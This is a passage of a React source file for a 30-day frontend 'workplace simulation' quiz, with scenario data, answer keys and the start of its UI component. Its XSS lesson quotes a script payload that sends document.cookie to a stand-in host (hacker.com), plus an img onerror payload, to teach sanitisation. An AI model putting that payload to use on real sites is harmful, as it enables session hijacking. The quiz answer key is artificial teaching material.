import React, { useState, useEffect } from "react";
import { 
  CheckCircle2, 
  AlertTriangle, 
  XCircle, 
  Star, 
  Briefcase, 
  Clock, 
  Sparkles, 
  ShieldAlert, 
  Target, 
  TrendingUp, 
  CheckCircle, 
  ArrowRight, 
  Lock, 
  Award,
  Lightbulb,
  ChevronRight,
  HelpCircle
} from "lucide-react";

// Mock 30-Day Real-World Workplace Simulation Data
export const scenarioData = [
  {
    day: 1,
    title: "Frontend Workplace Simulation",
    subtitle: "Scenario 1 of 1",
    situation: "You have joined the frontend team of an e-commerce company. The company is rebuilding its customer shopping website. Your mentor gives you the initial task: \"Start working on the new product-listing page. It must work on desktop, tablet and mobile.\" Before writing code, you need to decide how you will begin.",
    question: "How would you plan the responsive layout and architecture before writing initial code?",
    options: [
      {
        id: "a",
        text: "Plan a responsive mobile-first component grid layout and define breakpoint utility variables before writing styling.",
        isCorrect: true,
        feedbackTitle: "[SUCCESS] EXCELLENT DECISION",
        feedbackType: "success",
        explanation: "A responsive application should be planned for different screen sizes from the beginning. You understood the requirements before implementation.\n\nDay 2 situation: Your mentor gives you the approved desktop, tablet and mobile designs."
      },
      {
        id: "b",
        text: "Start writing desktop styles immediately with fixed pixel widths and adjust mobile later if bugs are reported.",
        isCorrect: false,
        feedbackTitle: "[WARNING] SUBOPTIMAL APPROACH",
        feedbackType: "warning",
        explanation: "Starting with fixed desktop widths often leads to hard-to-maintain CSS refactors later. Mobile-first or pre-planned breakpoints prevent responsive regression bugs."
      },
      {
        id: "c",
        text: "Copy & paste layout code from a non-responsive legacy project and tweak inline styles.",
        isCorrect: false,
        feedbackTitle: "âŒ RISKY DECISION",
        feedbackType: "danger",
        explanation: "Copying non-responsive legacy code introduces technical debt and inline styles make global design system updates difficult."
      }
    ]
  },
  {
    day: 2,
    title: "Frontend Workplace Simulation",
    subtitle: "Scenario 1 of 1",
    situation: "The product page is now being developed. The design contains: - Product image - Product name - Price - Rating - Add-to-cart button. You need to create the product card component.",
    question: "You need to create the product card component. What approach would you take?",
    options: [
      {
        id: "a",
        text: "Create a reusable product-card component that receives product information through props.",
        isCorrect: true,
        feedbackTitle: "[SUCCESS] EXCELLENT DECISION",
        feedbackType: "success",
        explanation: "Creating a reusable product-card component ensures consistency across all catalog pages, simplifies maintenance, and enables component testing.\n\nDay 3 situation: Your component is ready. Now you need to handle real-time shopping cart updates."
      },
      {
        id: "b",
        text: "Create the card directly inside the product page and reuse it later if needed.",
        isCorrect: false,
        feedbackTitle: "[WARNING] SUBOPTIMAL APPROACH",
        feedbackType: "warning",
        explanation: "Tightly coupling the card to a single page prevents reuse on search, recommendations, or checkout pages."
      },
      {
        id: "c",
        text: "Copy and paste the same card code wherever a product appears.",
        isCorrect: false,
        feedbackTitle: "âŒ POOR PRACTICE",
        feedbackType: "danger",
        explanation: "Duplicating JSX code creates maintenance bottlenecks - updating a price tag would require changes in 20+ files."
      }
    ]
  },
  {
    day: 3,
    title: "Frontend Workplace Simulation",
    subtitle: "Scenario 1 of 1",
    situation: "Users click \"Add to Cart\" on multiple products across different pages. The header cart badge, sliding side drawer, and main cart checkout summary all need to stay updated instantaneously without full page reloads.",
    question: "How would you structure the application state to handle shopping cart interactions?",
    options: [
      {
        id: "a",
        text: "Implement React Context API or Global State Management (Zustand/Redux) to maintain a single source of truth for cart items.",
        isCorrect: true,
        feedbackTitle: "[SUCCESS] EXCELLENT DECISION",
        feedbackType: "success",
        explanation: "Centralized state management prevents prop drilling and guarantees synchronized UI updates across disconnected header, side drawer, and checkout components.\n\nDay 4 situation: Your cart logic is solid! Next, the backend team deploys a new REST API endpoint."
      },
      {
        id: "b",
        text: "Pass cart state and update functions through 8 levels of parent and child component props manually.",
        isCorrect: false,
        feedbackTitle: "[WARNING] PROP DRILLING WARNING",
        feedbackType: "warning",
        explanation: "Deep prop drilling makes intermediate components unnecessary re-render targets and hard to refactor."
      },
      {
        id: "c",
        text: "Store cart items inside DOM data attributes (`data-cart-items`) and query the DOM with document.querySelector.",
        isCorrect: false,
        feedbackTitle: "âŒ DOM MUTATION ANTI-PATTERN",
        feedbackType: "danger",
        explanation: "Direct DOM queries break React's declarative state model and risk state desynchronization."
      }
    ]
  },
  {
    day: 4,
    title: "Frontend Workplace Simulation",
    subtitle: "Scenario 1 of 1",
    situation: "The backend product catalog REST API server occasionally experiences 2-second response latencies or temporary 503 gateway timeouts. Right now, interns report a completely blank white screen during data fetching.",
    question: "How will you handle loading state and network failure boundaries in the user interface?",
    options: [
      {
        id: "a",
        text: "Implement Skeleton loader components during pending fetches and Error Boundary retry cards with user-friendly error messages.",
        isCorrect: true,
        feedbackTitle: "[SUCCESS] EXCELLENT DECISION",
        feedbackType: "success",
        explanation: "Skeleton loaders reduce perceived user wait time, and fallback retry UI prevents app crashes on network flickers.\n\nDay 5 situation: Users love the smooth loading experience! Now search volume is surging."
      },
      {
        id: "b",
        text: "Keep the screen blank until data loads, and show a raw browser `alert()` modal if the API returns an error.",
        isCorrect: false,
        feedbackTitle: "[WARNING] POOR USER EXPERIENCE",
        feedbackType: "warning",
        explanation: "Blank screens confuse users into thinking the app is frozen, and native alert modals ruin user experience."
      },
      {
        id: "c",
        text: "Log the network error silently to console.error and leave the UI stuck in loading state forever.",
        isCorrect: false,
        feedbackTitle: "âŒ UNHANDLED REJECTION",
        feedbackType: "danger",
        explanation: "Infinite loading states cause user frustration and high abandon rates."
      }
    ]
  },
  {
    day: 5,
    title: "Frontend Workplace Simulation",
    subtitle: "Scenario 1 of 1",
    situation: "As users type into the search bar, an API request triggers on every single keydown event. Typing \"headphone\" fires 9 API requests in less than 1 second, overloading backend servers.",
    question: "How will you optimize search input requests to protect server resources?",
    options: [
      {
        id: "a",
        text: "Apply a 300ms Debounce custom hook on search input changes so requests fire only when typing pauses.",
        isCorrect: true,
        feedbackTitle: "[SUCCESS] EXCELLENT DECISION",
        feedbackType: "success",
        explanation: "Debouncing reduces network request volume by over 80% while retaining instant responsiveness.\n\nDay 6 situation: Search is optimized! Now catalog data is growing rapidly."
      },
      {
        id: "b",
        text: "Disable the live search feature entirely and force users to click a 'Submit Search' button.",
        isCorrect: false,
        feedbackTitle: "[WARNING] FEATURE REDUCTION",
        feedbackType: "warning",
        explanation: "Removing live search reduces user experience modern standards when simple debouncing easily solves the problem."
      },
      {
        id: "c",
        text: "Trigger requests on keydown, keyup, and focus events to capture all keyboard signals.",
        isCorrect: false,
        feedbackTitle: "âŒ SERVER FLOODING",
        feedbackType: "danger",
        explanation: "Triplicating events amplifies server load and leads to rate limiting (429 errors)."
      }
    ]
  },
  {
    day: 6,
    title: "Frontend Workplace Simulation",
    subtitle: "Scenario 1 of 1",
    situation: "The product database has scaled to 40,000 items. Fetching and rendering all products into the DOM at once causes low-end mobile browser tabs to crash due to DOM node overhead.",
    question: "Which data rendering technique should you implement for high-volume datasets?",
    options: [
      {
        id: "a",
        text: "Implement server-side pagination with query params (`page=1&limit=20`) combined with virtualized list rendering.",
        isCorrect: true,
        feedbackTitle: "[SUCCESS] EXCELLENT DECISION",
        feedbackType: "success",
        explanation: "Server pagination keeps payload size under 50KB, while windowing/virtualization renders only DOM nodes visible in viewport.\n\nDay 7 situation: Mobile performance is top-tier! Senior dev schedule code review."
      },
      {
        id: "b",
        text: "Fetch all 40,000 items in one giant JSON array and render all 40,000 HTML elements inside a CSS scroll view.",
        isCorrect: false,
        feedbackTitle: "âŒ MEMORY CRASH RISK",
        feedbackType: "danger",
        explanation: "Rendering tens of thousands of active DOM nodes consumes over 1GB memory, freezing browser threads."
      },
      {
        id: "c",
        text: "Limit the entire database response to only 10 items total permanently.",
        isCorrect: false,
        feedbackTitle: "[WARNING] ARTIFICIAL LIMITATION",
        feedbackType: "warning",
        explanation: "Hardcoding a 10-item cap hides 99.9% of catalog products from customers."
      }
    ]
  },
  {
    day: 7,
    title: "Frontend Workplace Simulation",
    subtitle: "Scenario 1 of 1",
    situation: "During code review of your Pull Request (PR), a Senior Frontend Engineer flags that your main component is 650 lines long with mixed concerns (API calls, UI templates, form validation logic).",
    question: "How should you refactor the Pull Request before merging to production?",
    options: [
      {
        id: "a",
        text: "Decompose into smaller single-responsibility components, extract API calls into custom hooks (`useProducts`), and add prop-types validation.",
        isCorrect: true,
        feedbackTitle: "[SUCCESS] EXCELLENT DECISION",
        feedbackType: "success",
        explanation: "Clean Architecture separates UI presentational layers from data hooks, making unit testing and maintainability effortless.\n\nDay 8 situation: Your refactored PR was approved and merged! Time for assets optimization."
      },
      {
        id: "b",
        text: "Comment on the PR arguing that a single file is easier to open in the code editor.",
        isCorrect: false,
        feedbackTitle: "[WARNING] TEAM CONFLICT",
        feedbackType: "warning",
        explanation: "Monolithic files increase git merge conflicts and violate modular design patterns."
      },
      {
        id: "c",
        text: "Bypass code review checks and force-merge the branch into main.",
        isCorrect: false,
        feedbackTitle: "âŒ VIOLATION OF PROCESS",
        feedbackType: "danger",
        explanation: "Bypassing branch protection policies breaks team trust and bypasses automated CI pipelines."
      }
    ]
  },
  {
    day: 8,
    title: "Frontend Workplace Simulation",
    subtitle: "Scenario 1 of 1",
    situation: "The product manager notes that page load speed score on Google Lighthouse dropped to 42 because product images are raw 4MB PNG files uploaded by vendors.",
    question: "What media optimization strategy should you deploy?",
    options: [
      {
        id: "a",
        text: "Serve WebP/AVIF image formats, dynamic srcset responsive sizes, and apply `loading=\"lazy\"` for off-screen images.",
        isCorrect: true,
        feedbackTitle: "[SUCCESS] EXCELLENT DECISION",
        feedbackType: "success",
        explanation: "Next-gen formats reduce image size by up to 80% without quality loss, boosting Lighthouse score to 95+.\n\nDay 9 situation: Speed is blazing! Now let's handle customer input security."
      },
      {
        id: "b",
        text: "Convert all images to inline Base64 data strings directly in JavaScript bundle files.",
        isCorrect: false,
        feedbackTitle: "âŒ BUNDLE BLOAT",
        feedbackType: "danger",
        explanation: "Base64 increases binary string size by 33% and inflates JS bundle downloads, slowing initial page load."
      },
      {
        id: "c",
        text: "Resize all images to 100x100 pixels fixed size regardless of display resolution.",
        isCorrect: false,
        feedbackTitle: "[WARNING] BLURRY QUALITY",
        feedbackType: "warning",
        explanation: "Fixed low-res thumbnails look pixelated on Retina and desktop displays."
      }
    ]
  },
  {
    day: 9,
    title: "Frontend Workplace Simulation",
    subtitle: "Scenario 1 of 1",
    situation: "Users can now write product reviews. Security audit team discovers that a malicious user posted `<script>document.location='http://hacker.com/steal?cookie='+document.cookie</script>` in a review text.",
    question: "How will you prevent Cross-Site Scripting (XSS) vulnerability when rendering user generated reviews?",
    options: [
      {
        id: "a",
        text: "Sanitize HTML using DOMPurify before rendering, avoid `dangerouslySetInnerHTML`, and set Content Security Policy headers.",
        isCorrect: true,
        feedbackTitle: "[SUCCESS] EXCELLENT DECISION",
        feedbackType: "success",
        explanation: "Proper string escaping and DOM sanitization prevents script injection attacks, protecting customer session tokens.\n\nDay 10 situation: Security patch deployed! Next up: Persistent user authentication."
      },
      {
        id: "b",
        text: "Render user reviews using `dangerouslySetInnerHTML={{ __html: reviewText }}` directly.",
        isCorrect: false,
        feedbackTitle: "âŒ CRITICAL SECURITY HOLE",
        feedbackType: "danger",
        explanation: "Using raw HTML injection directly exposes all site visitors to session hijacking."
      },
      {
        id: "c",
        text: "Filter out only the exact word 'script' with string replace.",
        isCorrect: false,
        feedbackTitle: "[WARNING] BYPASSABLE FILTER",
        feedbackType: "warning",
        explanation: "Simple string matching is easily bypassed using tags like `<img src=x onerror=alert(1)>`."
      }
    ]
  },
  {
    day: 10,
    title: "Frontend Workplace Simulation",
    subtitle: "Scenario 1 of 1",
    situation: "When logged-in users refresh their browser window, they are unexpectedly redirected back to the login page because the auth state is wiped from memory.",
    question: "How should you store and maintain secure user authentication sessions across page refreshes?",
    options: [
      {
        id: "a",
        text: "Use HttpOnly SameSite Secure Cookies for JWT refresh tokens with an automated silent token refresh interceptor in Axios/Fetch.",
        isCorrect: true,
        feedbackTitle: "[SUCCESS] EXCELLENT DECISION",
        feedbackType: "success",
        explanation: "HttpOnly cookies prevent JavaScript access (XSS protection), while silent refresh keeps user sessions seamless.\n\nDay 11 situation: Auth system is enterprise-grade! Next: CI/CD deployment checks."
      },
      {
        id: "b",
        text: "Store plain-text user passwords in browser `localStorage` and re-authenticate on every page load.",
        isCorrect: false,
        feedbackTitle: "âŒ HIGH RISK SECURITY VULNERABILITY",
        feedbackType: "danger",
        explanation: "Storing plain text credentials in localStorage exposes user secrets to any third-party script or XSS attack."
      },
      {
        id: "c",
        text: "Keep session state solely in React component local state (`useState`).",
        isCorrect: false,
        feedbackTitle: "[WARNING] POOR PERSISTENCE",
        feedbackType: "warning",
        explanation: "React memory state resets on every hard browser refresh or tab navigation."
      }
    ]
  },
  // Generate remaining days 11 to 30 with high-quality real workplace simulations
  ...Array.from({ length: 20 }, (_, i) => {
    const dayNum = i + 11;
    const topics = [
      { t: "CI/CD Pipeline Automated Testing", desc: "Your commit triggered a build failure in GitHub Actions because ESLint found unused variables and failing snapshot tests.", q: "How do you handle automated CI pipeline failures before pushing to release branches?", best: "Run lint & unit test suites locally (`npm run test`), fix violations, and re-push clean commits.", alt1: "Disable linting rules in .eslintrc.js to force the build green.", alt2: "Delete failing unit test files." },
      { t: "Internationalization & Multi-language Support", desc: "The app is expanding to global markets. Hardcoded English string literals need to support French, Spanish, and German.", q: "What approach best supports dynamic localization without duplicating UI code?", best: "Implement react-i18next translation keys and lazy-load locale JSON dictionaries.", alt1: "Create separate HTML files for each spoken language.", alt2: "Use Google Translate iframe widget." },
      { t: "Dark Mode Theme Tokens", desc: "Product designers provided a dark theme specification with dynamic color variables.", q: "How should theme tokens be organized in the CSS design system?", best: "Define CSS custom properties (`:root` / `[data-theme='dark']`) for semantic colors like background and text colors.", alt1: "Add inline style conditions `style={{ color: isDark ? '#fff' : '#000' }}` on every single HTML tag.", alt2: "Duplicate all CSS stylesheets into dark-style.css." },
      { t: "Real-Time WebSocket Notifications", desc: "Order status updates need to push live alerts to customer screens when shipping status changes.", q: "How will you handle WebSocket connection reconnects and memory leaks?", best: "Establish WebSocket connection inside `useEffect`, handle automatic reconnection exponential backoff, and clean up listeners on unmount.", alt1: "Poll backend REST API every 100 milliseconds infinitely.", alt2: "Never close WebSocket connections when leaving the page." },
      { t: "Accessibility (a11y) Compliance", desc: "Screen reader users report inability to navigate modal dialogs or identify icon-only buttons.", q: "How will you elevate WCAG 2.1 AA accessibility standards?", best: "Add semantic ARIA labels (`aria-label`, `role=\"dialog\"`), focus trap within active modals, and ensure full keyboard TAB navigation.", alt1: "Add title tooltips on image elements.", alt2: "Ignore keyboard navigation as mouse users represent majority." },
      { t: "Form State & Validation Libraries", desc: "Complex checkout forms with address validation and credit card formatting cause lagging re-renders.", q: "Which form management pattern prevents frame drops during input typing?", best: "Use React Hook Form with un-controlled input refs and Schema validation (Zod/Yup).", alt1: "Store every character change in a single monolithic parent state causing 50 re-renders per second.", alt2: "Use unvalidated text inputs and rely on backend to reject bad data." },
      { t: "State Persistence & Offline Sync", desc: "Interns working on mobile networks lose draft form data when going through tunnels or offline zones.", q: "How can offline capability be implemented to preserve draft inputs?", best: "Register a Service Worker, sync offline form drafts using IndexedDB / Redux Persist, and retry submission on `online` window event.", alt1: "Display a full-screen offline error modal that clears all form inputs.", alt2: "Force mobile users to remain connected to Wi-Fi." },
      { t: "Third-Party Analytics & Performance", desc: "Marketing added 5 tracking pixels (Google Analytics, Mixpanel, Hotjar) which degraded core web vitals.", q: "How will you integrate third-party scripts without blocking critical rendering paths?", best: "Load non-critical scripts asynchronously (`async`/`defer`) or offload via Web Workers (Partytown).", alt1: "Place all tracking scripts synchronously in the HTML `<head>` tag before stylesheets.", alt2: "Remove all analytics scripts without telling marketing." },
      { t: "Micro-Frontend Modular Architecture", desc: "The payment team wants to deploy checkout updates independently from the main catalog app.", q: "What architectural pattern supports independent deployment pipelines?", best: "Adopt Webpack Module Federation or Vite Single-SPA micro-frontends with clear interface contracts.", alt1: "Embed the payment site inside an inline iframe.", alt2: "Keep all 50 developers committing directly to master branch without domain separation." },
      { t: "Zero-Downtime Feature Flags", desc: "A new AI recommendation widget needs to be rolled out safely to 10% of users first.", q: "How do you control feature availability in production environments?", best: "Wrap new components in a Remote Feature Flag evaluation hook with gradual canary percentage rollouts.", alt1: "Comment out code in production and deploy hotfix releases every hour.", alt2: "Deploy two completely different domains for users." },
      { t: "Design System Component Tokens", desc: "Designers changed the primary button radius from 4px to 12px across 200 screen layouts.", q: "How do central design tokens save refactoring time?", best: "Update centralized CSS token variable `--border-radius-primary` in design system config.", alt1: "Find and replace `border-radius: 4px` manually across 200 files.", alt2: "Override with `!important` in random CSS files." },
      { t: "Error Logging & Telemetry Sentry Integration", desc: "Uncaught JavaScript runtime errors are happening on specific mobile devices in production.", q: "How will developers capture and diagnose client-side exceptions remotely?", best: "Integrate Sentry / LogRocket SDK with source maps to track stack traces and browser metadata.", alt1: "Ask affected users to open Chrome Developer Tools on mobile and send screenshots.", alt2: "Suppress all window error events." },
      { t: "PWA Service Worker Caching Strategies", desc: "Static assets (fonts, icons, bundle files) are re-downloaded on every page load.", q: "Which Service Worker caching strategy optimizes static asset delivery?", best: "Implement Cache-First strategy for static immutable assets and Stale-While-Revalidate for API responses.", alt1: "Disable browser HTTP caching headers completely.", alt2: "Cache everything Network-Only without storage." },
      { t: "Cross-Browser CSS Compatibility", desc: "Safari iOS users report grid layouts collapsing because of modern flex gap syntax incompatibilities.", q: "How do you ensure cross-browser CSS fallback compatibility?", best: "Use PostCSS Autoprefixer with Browserslist config and target flexbox margin fallbacks.", alt1: "Display a message 'Please use Chrome on Desktop only'.", alt2: "Remove flexbox layouts." },
      { t: "API Rate Limiting & Exponential Backoff", desc: "High traffic spikes trigger 429 Too Many Requests errors from backend microservices.", q: "How should client network layers handle rate-limited API responses?", best: "Catch 429 status codes in HTTP client interceptor and retry with exponential backoff and jitter.", alt1: "Fire 10 rapid retry requests immediately upon error.", alt2: "Log out the user instantly." },
      { t: "DOM Memory Leak Prevention", desc: "Navigating between tabs causes browser memory usage to steadily climb from 100MB to 1.2GB.", q: "What is the common cause of React component memory leaks during page navigation?", best: "Uncleaned event listeners (`window.removeEventListener`), active setInterval timers, or uncancelled async fetch promises.", alt1: "React re-renders.", alt2: "Browser font loading." },
      { t: "GraphQL vs REST API Optimization", desc: "Catalog view needs only product title and price, but REST endpoint returns 80 unused fields.", q: "How can payload over-fetching be solved?", best: "Utilize GraphQL queries to request specific fields or request specialized lightweight REST view DTOs.", alt1: "Filter out JSON keys on client after downloading full 2MB payload.", alt2: "Delete backend database fields." },
      { t: "SEO Meta Tags & Dynamic Open Graph", desc: "Shared links on Twitter/LinkedIn show blank preview cards instead of product titles and images.", q: "How do you enable dynamic Open Graph meta tags for shared URLs?", best: "Implement Server-Side Rendering (SSR) or Static Site Generation (SSG) with dynamic `<meta property=\"og:image\">` tags.", alt1: "Client-side update `<title>` tag after 2 second delay.", alt2: "Ask users to download PDF catalog." },
      { t: "State Normalization for Complex Lists", desc: "Updating an item nested 4 levels deep in an array of categories causes full tree re-renders.", q: "How should nested application state be normalized?", best: "Normalize state by mapping items by unique IDs (`byId: {}, allIds: []`) for O(1) lookups and isolated updates.", alt1: "Mutate deeply nested state directly with `state.items[0].sub[2] = val`.", alt2: "Re-fetch complete backend database on every edit." },
      { t: "Final Production Deployment Readiness", desc: "The 30-day workplace internship concludes. Project needs final staging security audit & release candidate tag.", q: "What is the final checklist for production readiness?", best: "Execute clean production build, run automated end-to-end (E2E) tests, verify security headers, and verify zero console errors.", alt1: "Push code directly to production without testing.", alt2: "Turn off production monitoring." }
    ];

    const item = topics[i % topics.length];
    return {
      day: dayNum,
      title: "Frontend Workplace Simulation",
      subtitle: `Scenario 1 of 1`,
      situation: `Day ${dayNum}: ${item.t}. ${item.desc}`,
      question: item.q,
      options: [
        {
          id: "a",
          text: item.best,
          isCorrect: true,
          feedbackTitle: "[SUCCESS] EXCELLENT DECISION",
          feedbackType: "success",
          explanation: `Great choice! Applying industry best practices for ${item.t.toLowerCase()} keeps application quality high.\n\nDay ${dayNum < 30 ? dayNum + 1 : 30} situation: Your team advances to the next operational phase.`
        },
        {
          id: "b",
          text: item.alt1,
          isCorrect: false,
          feedbackTitle: "[WARNING] SUBOPTIMAL APPROACH",
          feedbackType: "warning",
          explanation: `This approach introduces technical debt or temporary workarounds that don't address the root cause.`
        },
        {
          id: "c",
          text: item.alt2,
          isCorrect: false,
          feedbackTitle: "âŒ POOR PRACTICE",
          feedbackType: "danger",
          explanation: `This action violates software engineering standards and risks system stability.`
        }
      ]
    };
  })
];

export default function DailyScenario({ onBackToDashboard }) {
  // State for user progress and selected day
  const [selectedDay, setSelectedDay] = useState(1);
  const [selectedOptionId, setSelectedOptionId] = useState(null);
  const [submittedDays, setSubmittedDays] = useState({}); // { [day]: { selectedOptionId, isCorrect } }
  const [isDemoBypass, setIsDemoBypass] = useState(false);
  const [nowTime, setNowTime] = useState(new Date());

  useEffect(() => {
    const timer = setInterval(() => {
      setNowTime(new Date());
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  const isDayUnlocked = (day) => {
    if (isDemoBypass) return true;
    if (day === 1) return true;
    return false;
  };

  const getTimeUntilMidnight = () => {
    const now = new Date();
    const midnight = new Date(now);
    midnight.setHours(24, 0, 0, 0);
    const diff = midnight - now;

    const hours = Math.floor((diff / (1000 * 60 * 60)) % 24);
    const minutes = Math.floor((diff / (1000 * 60)) % 60);
    const seconds = Math.floor((diff / 1000) % 60);

    return `${hours.toString().padStart(2, '0')}h ${minutes.toString().padStart(2, '0')}m ${seconds.toString().padStart(2, '0')}s`;
  };

  const currentScenario = scenarioData.find((s) => s.day === selectedDay) || scenarioData[0];
  const currentSubmission = submittedDays[selectedDay];
  const isCompleted = !!currentSubmission;
  const chosenOption = currentScenario.options.find((o) => o.id === (currentSubmission?.selectedOptionId || selectedOptionId));

  const completedCount = Object.keys(submittedDays).length;

  const handleSubmitDecision = () => {
    if (!selectedOptionId) {
      alert("Please select an option before submitting your decision.");
      return;
    }
    const option = currentScenario.options.find((o) => o.id === selectedOptionId);
    setSubmittedDays((prev) => ({
      ...prev,
      [selectedDay]: {
        selectedOptionId,
        isCorrect: option?.isCorrect || false
      }
    }));
  };

  const handleSelectDay = (day) => {
    setSelectedDay(day);
    setSelectedOptionId(submittedDays[day]?.selectedOptionId || null);
  };

  return (
    <div style={{ display: "flex", flexDirection: "column", gap: "24px", width: "100%" }}>
      
      {/* Hero Banner Header */}
      <div style={{
        background: "linear-gradient(135deg, #dbeafe 0%, #bfdbfe 50%, #93c5fd 100%)",
        borderRadius: "12px",
        padding: "14px 20px",
        color: "#0f172a",
        position: "relative",
        overflow: "hidden",
        boxShadow: "0 2px 8px rgba(191, 219, 254, 0.4)",
        border: "1px solid #bfdbfe"
      }}>
        {/* Mountain Silhouette Background SVG */}
        <svg style={{ position: "absolute", right: "0", bottom: 0, height: "100%", width: "50%", opacity: 0.35, pointerEvents: "none" }} viewBox="0 0 400 200" fill="none" preserveAspectRatio="none">
          <path d="M0 200 L140 60 L240 160 L350 10 L400 200 Z" fill="#0284c7" />
          <path d="M100 200 L250 40 L340 130 L400 200 Z" fill="#0369a1" opacity="0.7" />
        </svg>
        
        {/* "Learn Build Grow" Watermark */}
        <div style={{ position: "absolute", right: "24px", top: "8px", opacity: 0.12, transform: "rotate(-10deg)", pointerEvents: "none" }}>
          <span style={{ fontSize: "22px", fontWeight: 900, color: "#1d4ed8", lineHeight: 1, display: "block" }}>Learn</span>
          <span style={{ fontSize: "22px", fontWeight: 900, color: "#1d4ed8", lineHeight: 1, display: "block", marginLeft: "10px" }}>Build</span>
          <span style={{ fontSize: "22px", fontWeight: 900, color: "#1d4ed8", lineHeight: 1, display: "block", marginLeft: "20px" }}>Grow</span>
        </div>

        <div style={{ position: "relative", zIndex: 2, display: "flex", gap: "14px", alignItems: "center" }}>
          <div style={{ width: "44px", height: "44px", background: "#ffffff", borderRadius: "12px", display: "flex", alignItems: "center", justifyContent: "center", boxShadow: "0 4px 12px rgba(37, 99, 235, 0.15)", flexShrink: 0 }}>
            <Briefcase size={22} color="#2563eb" />
          </div>
          <div>
            <span style={{ fontSize: "10px", fontWeight: 800, textTransform: "uppercase", letterSpacing: "1.5px", color: "#1d4ed8", display: "block", marginBottom: "2px" }}>
              Day {selectedDay} of 30 &bull; Workplace Simulation
            </span>
            <h1 style={{ fontSize: "1.3rem", fontWeight: 800, margin: "0 0 2px 0", color: "#0f172a", letterSpacing: "-0.02em" }}>
              Real-World Workplace Simulation
            </h1>
            <p style={{ margin: 0, fontSize: "12px", color: "#334155", maxWidth: "600px", lineHeight: "1.4" }}>
              Analyze realistic engineering situations, choose your technical path, and receive instant feedback.
            </p>
          </div>
        </div>
      </div>

      {/* Main Grid Content */}
      <div style={{ display: "grid", gridTemplateColumns: "1fr 340px", gap: "24px" }}>
        
        {/* Left Column: Workplace Scenario Main Area */}
        <div style={{ display: "flex", flexDirection: "column", gap: "20px" }}>
          
          {!isDayUnlocked(selectedDay) ? (
            /* Locked Day Card */
            <div className="card" style={{ textAlign: "center", padding: "50px 24px", backgroundColor: "var(--card-bg)", borderRadius: "16px", border: "1px solid var(--border-color)", boxShadow: "0 4px 12px rgba(0,0,0,0.03)" }}>
              <div style={{ width: "64px", height: "64px", borderRadius: "50%", backgroundColor: "#eff6ff", color: "#2563eb", display: "flex", justifyContent: "center", alignItems: "center", margin: "0 auto 20px auto" }}>
                <Lock size={32} />
              </div>
              <h2 style={{ fontSize: "22px", fontWeight: "800", color: "var(--text-dark)", margin: "0 0 10px 0" }}>
                Day {selectedDay} Scenario is Locked
              </h2>
              <p style={{ color: "var(--text-muted)", fontSize: "15px", maxWidth: "480px", margin: "0 auto 24px auto", lineHeight: "1.6" }}>
                Daily workplace simulations unlock automatically every night at <b>12:00 AM Midnight</b>.
              </p>

              <div style={{ display: "inline-block", backgroundColor: "#eff6ff", padding: "12px 24px", borderRadius: "10px", border: "1px solid #bfdbfe", marginBottom: "24px" }}>
                <span style={{ fontSize: "13px", color: "#1e40af", fontWeight: 600 }}>Unlocks in: </span>
                <span style={{ fontFamily: "monospace", fontSize: "16px", fontWeight: "800", color: "#1d4ed8" }}>{getTimeUntilMidnight()}</span>
              </div>

              <div>
                <button
                  onClick={() => setIsDemoBypass(true)}
                  className="btn btn-primary"
                  style={{ padding: "12px 24px", fontWeight: 700, borderRadius: "8px" }}
                >
                  Preview Day {selectedDay} Scenario (Demo Mode) &rarr;
                </button>
              </div>
            </div>
          ) : (
            /* Main Unlocked Scenario Container */
            <div className="card" style={{ padding: "28px", display: "flex", flexDirection: "column", gap: "24px", border: "1px solid var(--border-color)" }}>
              
              {/* Demo Mode Notice Banner */}
              {isDemoBypass && selectedDay > 1 && (
                <div style={{ backgroundColor: "#eff6ff", border: "1px solid #93c5fd", borderRadius: "8px", padding: "10px 16px", fontSize: "13px", color: "#1e40af", display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                  <span>[NOTICE] <b>Demo Mode Active:</b> Previewing Day {selectedDay}. (Normally unlocks at 12:00 AM Midnight).</span>
                  <button onClick={() => setIsDemoBypass(false)} style={{ background: "none", border: "none", color: "#2563eb", fontWeight: "700", cursor: "pointer", textDecoration: "underline", fontSize: "12px" }}>
                    Re-enable Lock
                  </button>
                </div>
              )}

              {/* Title Header */}
              <div style={{ borderBottom: "1px solid var(--border-color)", paddingBottom: "16px" }}>
                <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                  <h3 style={{ margin: 0, fontSize: "20px", fontWeight: "700", color: "var(--text-dark)" }}>
                    {currentScenario.title}
                  </h3>
                  <span style={{ fontSize: "12px", background: "#f1f5f9", padding: "4px 10px", borderRadius: "20px", color: "#475569", fontWeight: "600" }}>
                    {currentScenario.subtitle}
                  </span>
                </div>
              </div>

              {/* SITUATION Callout Card */}
              <div style={{
                backgroundColor: "#f0f9ff",
                borderLeft: "4px solid #0284c7",
                borderRadius: "0 12px 12px 0",
                padding: "20px 24px",
                borderTop: "1px solid #e0f2fe",
                borderRight: "1px solid #e0f2fe",
                borderBottom: "1px solid #e0f2fe"
              }}>
                <div style={{ display: "flex", alignItems: "center", gap: "8px", fontSize: "12px", fontWeight: "800", color: "#0284c7", textTransform: "uppercase", letterSpacing: "1px", marginBottom: "8px" }}>
                  <Briefcase size={16} /> SITUATION BRIEFING
                </div>
                <p style={{ margin: 0, fontSize: "15px", color: "#0f172a", lineHeight: "1.65", fontWeight: 400 }}>
                  {currentScenario.situation}
                </p>
              </div>

              {/* If NOT completed yet */}
              {!isCompleted ? (
                <div style={{ display: "flex", flexDirection: "column", gap: "20px" }}>
                  <h4 style={{ fontSize: "16px", fontWeight: "700", color: "var(--text-dark)", margin: 0, lineHeight: "1.5" }}>
                    {currentScenario.question}
                  </h4>

                  {/* Options List */}
                  <div style={{ display: "flex", flexDirection: "column", gap: "12px" }}>
                    {currentScenario.options.map((option) => {
                      const isSelected = selectedOptionId === option.id;

                      return (
                        <div
                          key={option.id}
                          onClick={() => setSelectedOptionId(option.id)}
                          style={{
                            display: "flex",
                            alignItems: "flex-start",
                            gap: "14px",
                            padding: "16px 20px",
                            borderRadius: "12px",
                            border: isSelected ? "2px solid #3b82f6" : "1px solid var(--border-color)",
                            backgroundColor: isSelected ? "#eff6ff" : "var(--card-bg)",
                            cursor: "pointer",
                            transition: "all 0.2s ease",
                            boxShadow: isSelected ? "0 2px 8px rgba(59, 130, 246, 0.15)" : "none"
                          }}
                        >
                          <input
                            type="radio"
                            name={`scenario-day-${selectedDay}`}
                            checked={isSelected}
                            onChange={() => setSelectedOptionId(option.id)}
